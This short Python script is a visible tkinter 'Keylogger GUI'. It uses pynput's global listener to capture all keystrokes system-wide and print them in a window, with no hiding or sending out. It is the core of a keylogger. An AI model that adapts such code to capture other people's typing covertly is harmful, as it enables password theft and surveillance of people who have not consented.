import tkinter as tk
from tkinter.scrolledtext import ScrolledText
from pynput.keyboard import Listener

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger GUI")
        self.create_widgets()

    def create_widgets(self):
        self.text_area = ScrolledText(self.root, height=20, width=60)
        self.text_area.pack(padx=10, pady=10)
        self.text_area.insert(tk.END, "Keylogger started. Press keys to log...\n")

    def on_press(self, key):
        key = str(key)
        if key == 'Key.space':
            key = ' '
        elif key == 'Key.enter':
            key = '\n'
        elif key == 'Key.backspace':
            self.text_area.delete("end-2c", tk.END)
            return
        
        self.text_area.insert(tk.END, key)

    def start_logging(self):
        with Listener(on_press=self.on_press) as listener:
            self.root.mainloop()

if __name__ == "__main__":
    root = tk.Tk()
    keylogger_gui = KeyloggerGUI(root)
    keylogger_gui.start_logging()
